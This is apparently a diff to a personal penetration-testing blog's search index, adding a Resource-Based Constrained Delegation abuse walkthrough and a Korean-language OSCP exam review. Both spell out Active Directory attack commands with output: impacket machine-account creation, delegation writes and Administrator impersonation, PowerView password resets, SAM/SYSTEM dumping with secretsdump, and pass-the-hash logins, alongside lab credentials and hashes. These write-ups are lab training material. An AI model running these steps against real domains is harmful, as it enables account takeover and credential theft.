@@ -4,8 +4,27 @@ var relearn_searchindex = [
     "content": "",
     "description": "",
     "tags": [],
-    "title": "Tag :: Davtest",
-    "uri": "/tags/davtest/index.html"
+    "title": "Tag :: GenericAll",
+    "uri": "/tags/genericall/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Posts \u003e Active Directory",
+    "content": "GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.\nGenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.\nStep 1 — Add a fake computer to the domain impacket-addcomputer creates a new machine account in the domain. We authenticate as l.livingstone using her NTLM hash.\nimpacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175 [*] Successfully added machine account fake$ with password password! Step 2 — Configure RBCD on the target computer Using our GenericAll rights, write fake$ into the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of RESOURCEDC$. This tells the target to trust fake$ for delegation.\nimpacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] fake$ (S-1-5-21-537427935-490066102-1511301751-4101) Step 3 — Request a service ticket as Administrator Using impacket-getST, perform S4U2Self + S4U2Proxy as fake$ to obtain a CIFS ticket impersonating Administrator.\nimpacket-getST resourced.local/fake$:'password!' -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip 192.168.176.175 [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Step 4 — Export the ticket Set the KRB5CCNAME environment variable so Impacket tools pick up the saved ticket automatically.\nexport KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Step 5 — Connect via psexec Since we authenticate with Kerberos, the target’s hostname must resolve correctly. Add an entry to /etc/hosts if needed, then connect using the ticket.\nimpacket-psexec -k -no-pass resourcedc.resourced.local",
+    "description": "GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.\nGenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.",
+    "tags": [
+      "RBCD",
+      "GenericAll"
+    ],
+    "title": "GenericAll permission on a domain computer",
+    "uri": "/posts/ad/rbcd/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Tags",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Tag :: RBCD",
+    "uri": "/tags/rbcd/index.html"
   },
   {
     "breadcrumb": "Zenu",
@@ -14,6 +33,30 @@ var relearn_searchindex = [
     "tags": [],
     "title": "Tags",
     "uri": "/tags/index.html"
+  },
+  {
+    "breadcrumb": "",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Zenu",
+    "uri": "/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Posts",
+    "content": "Active Directory cheatsheet\nGenericAll permission on a domain computer",
+    "description": "Active Directory cheatsheet\nGenericAll permission on a domain computer",
+    "tags": [],
+    "title": "Active Directory",
+    "uri": "/posts/ad/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Tags",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Tag :: Davtest",
+    "uri": "/tags/davtest/index.html"
   },
   {
     "breadcrumb": "Zenu \u003e Tags",
@@ -33,14 +76,6 @@ var relearn_searchindex = [
     ],
     "title": "WebDAV Exploitation with davtest",
     "uri": "/posts/webdav/index.html"
-  },
-  {
-    "breadcrumb": "",
-    "content": "",
-    "description": "",
-    "tags": [],
-    "title": "Zenu",
-    "uri": "/index.html"
   },
   {
     "breadcrumb": "Zenu \u003e Tags",
@@ -77,6 +112,14 @@ var relearn_searchindex = [
     "tags": [],
     "title": "Tag :: Writable",
     "uri": "/tags/writable/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Private",
+    "content": "결과 우선 결과는 60점.\n윈도우 머신 전부 풀었다.\nstand alone은 하나만 proof까지 풀었다.\nAD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.\n어느정도 운도 필요한 듯.\nActive Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server | ssl-cert: Subject: commonName=WS26.oscp.exam | Not valid before: 2026-03-05T23:59:45 |_Not valid after: 2026-09-04T23:59:45 |_ssl-date: TLS randomness does not represent time | rdp-ntlm-info: | Target_Name: OSCP | NetBIOS_Domain_Name: OSCP | NetBIOS_Computer_Name: WS26 | DNS_Domain_Name: oscp.exam | DNS_Computer_Name: WS26.oscp.exam | DNS_Tree_Name: oscp.exam | Product_Version: 10.0.22621 |_ System_Time: 2026-03-07T00:17:03+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found evil-winrm을 사용해서 접속했다.\n처음에 모든 enum을 실시했는데 하나도 공격 벡터로 이어지는게 없었다.\npowerview, winpeas, 스케줄태스크, 서비스들, 내부네트워크 등등\nenum만 3시간 정도 시간 사용.\n결국 bloodhound로 단서를 찾았다.\nr.andrews -\u003e g.jarvis에 AllExtendRights가 있었다.\n아래 순서대로 입력하면 g.jarvis의 비밀번호를 변경할 수 있다.\nPS C:\\users\\r.andrews\\Documents\u003e Import-Module .\\PowerView.ps1 PS C:\\users\\r.andrews\\Documents\u003e $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force PS C:\\users\\r.andrews\\Documents\u003e Set-DomainUserPassword -Identity 'g.jarvis' -Verbose cmdlet Set-DomainUserPassword at command pipeline position 1 Supply values for the following parameters: AccountPassword: ************ VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'g.jarvis' VERBOSE: [Set-DomainUserPassword] Password for user 'g.jarvis' successfully reset 이후 g.jarvis로 이동.\nwinpeas를 실행하고 잘 살펴보면 관리자의 크레덴셜이 적혀있었다.\nadministrator / CarHammerChip964\n알고나면 엄청 간단한데 bloodhound를 너무 늦게 확인하는 바람에 3시간이나 써버렸다.\n너무 복잡하면 공격 벡터가 아닐 확률이 높다.\nAdmin 관리자로 다음 타겟의 크레덴셜을 찾아야한다.\nmimikatz를 실행해서 명령어를 다 넣어봤는데 걸리는 크레덴셜이 하나도 없었다.\n파워쉘 히스토리를 보니까 다음 유저의 크레덴셜이 있었다.\n*Evil-WinRM* PS C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSREadline\u003e type ConsoleHost_history.txt Get-Service | Where-Object {.Status -eq \"Running\"} Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Get-NetAdapter | Where-Object {.Status -eq \"Up\"} Get-ChildItem -Path C:\\ -Recurse | Where-Object {.Length -gt 100MB} Invoke-Command -ComputerName DC20 -ScriptBlock {Get-ADUser -Filter * -Properties LastLogonDate} New-ADUser -Name \"Barrett Martin\" -SamAccountName \"b.martin\" -UserPrincipalName \"b.martin@oscp.exam\" -AccountPassword (ConvertTo-SecureString \"BusyWorkerDay777\" -AsPlainText -Force) -Enabled True Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force -Confirm:False [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; = 'https://raw.githubusercontent.com/stevencohn/WindowsPowerShell/main' 이건 그래도 빨리 찾아냈는데, 파일안에 숨기는 패턴이 나왔었다고 생각하면 끔찍하다.\nSRV22 .202 b.martin / BusyWorkerDay777로 접속\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: OSCP | NetBIOS_Domain_Name: OSCP | NetBIOS_Computer_Name: SRV22 | DNS_Domain_Name: oscp.exam | DNS_Computer_Name: SRV22.oscp.exam | DNS_Tree_Name: oscp.exam | Product_Version: 10.0.17763 |_ System_Time: 2026-03-07T08:39:50+00:00 | ssl-cert: Subject: commonName=SRV22.oscp.exam | Not valid before: 2026-03-05T23:59:29 |_Not valid after: 2026-09-04T23:59:29 |_ssl-date: 2026-03-07T08:40:30+00:00; +1s from scanner time. 8080/tcp open http Jetty 10.0.20 |_http-server-header: Jetty(10.0.20) | http-robots.txt: 1 disallowed entry |_/ |_http-title: Site doesn't have a title (text/html;charset=utf-8). 3389가 열려있어서 리모트데스크탑으로 연결했다.\nxfreerdp3 /v:172.16.122.202 /u:b.martin /p:BusyWorkerDay777 /size:1200x900\n시작화면에서 터미널이 실행안되지만, 폴더의 어드레스바에 cmd를 입력해서 터미널을 여는데 성공.\n8080포트에 웹서버가 있는데 이건 함정이었다.\n취약점이 없는 jenkins가 있었다.\nProgram Files에 mssql가 있는걸 발견했다.\n터미널에 sqlcmd를 입력하면 mssql 인터액티브 창이 실행된다.\nSELECT name FROM master.dbo.sysdatabases; go use accounts; go SELECT table_name FROM information_schema.tables; go select * from creds; go 여기서 유저들의 정보를 대량 발견.\n스프레이로 유효한 어카운트를 찾았다.\ncrackmapexec smb 172.16.122.202 -u c.rogers -p SnoozeRinseRevolve231 --shares SMB 172.16.122.202 445 SRV22 [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False) SMB 172.16.122.202 445 SRV22 [+] oscp.exam\\c.rogers:SnoozeRinseRevolve231 (Pwn3d!) SMB 172.16.122.202 445 SRV22 [+] Enumerated shares SMB 172.16.122.202 445 SRV22 Share Permissions Remark SMB 172.16.122.202 445 SRV22 ----- ----------- ------ SMB 172.16.122.202 445 SRV22 ADMIN$ READ,WRITE Remote Admin SMB 172.16.122.202 445 SRV22 C$ READ,WRITE Default share SMB 172.16.122.202 445 SRV22 IPC$ READ Remote IPC impacket-psexec으로 관리자 터미널 실행.\nimpacket-psexec oscp.exam/c.rogers:SnoozeRinseRevolve231@172.16.122.202\nDC200 .200 c.rogers의 크레덴셜로 마지막 DC까지 로그인\nwhoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeBackupPrivilege가 있다.\nevil-winrm이 있으면 download로 파일을 옮길 수 있어서, 포트포워딩도 필요 없어서 너무 편하다.\n*Evil-WinRM* PS C:\\Users\\c.rogers\u003e reg save hklm\\sam sam The operation completed successfully. *Evil-WinRM* PS C:\\Users\\c.rogers\u003e reg save hklm\\system system The operation completed successfully. impacket-secretsdump -sam sam -system system local Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xd359caefd2dd5a5551dd5a71481c194e [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1932cc134540745795a0c48f58cfc49::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Cleaning up... 관리자의 해시를 획득.\nevil-winrm -i 172.16.122.200 -u administrator -H f1932cc134540745795a0c48f58cfc49\n이걸로 도메인 어드민의 플래그까지 획득.",
+    "description": "결과 우선 결과는 60점.\n윈도우 머신 전부 풀었다.\nstand alone은 하나만 proof까지 풀었다.\nAD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.\n어느정도 운도 필요한 듯.\nActive Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.",
+    "tags": [],
+    "title": "OSCP 시험 후기",
+    "uri": "/private/oscp/index.html"
   },
   {
     "breadcrumb": "Zenu \u003e Tags",
@@ -128,7 +171,7 @@ var relearn_searchindex = [
     "content": "",
     "description": "",
     "tags": [],
-    "title": "Tag :: BloodHound",
+    "title": "Tag :: Bloodhound",
     "uri": "/tags/bloodhound/index.html"
   },
   {
@@ -145,7 +188,7 @@ var relearn_searchindex = [
     "description": "Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.",
     "tags": [
       "SeRestorePrivilege",
-      "BloodHound",
+      "Bloodhound",
       "ReadGMSAPassword",
       "Responder",
       "GMSApassword",
@@ -233,7 +276,7 @@ var relearn_searchindex = [
     "tags": [
       "Responder",
       "DACL",
-      "BloodHound",
+      "Bloodhound",
       "Ntlm_theft",
       "SharpGPOAbuse",
       "Impacket-Owneredit",
@@ -280,11 +323,19 @@ var relearn_searchindex = [
   },
   {
     "breadcrumb": "Zenu",
-    "content": "Cheat Sheets \u0026 Tips\nFile Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
-    "description": "Cheat Sheets \u0026 Tips\nFile Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
+    "content": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
+    "description": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
     "tags": [],
     "title": "Posts",
     "uri": "/posts/index.html"
+  },
+  {
+    "breadcrumb": "Zenu",
+    "content": "프라이빗 창고",
+    "description": "프라이빗 창고",
+    "tags": [],
+    "title": "Private",
+    "uri": "/private/index.html"
   },
   {
     "breadcrumb": "Zenu \u003e Writeup",
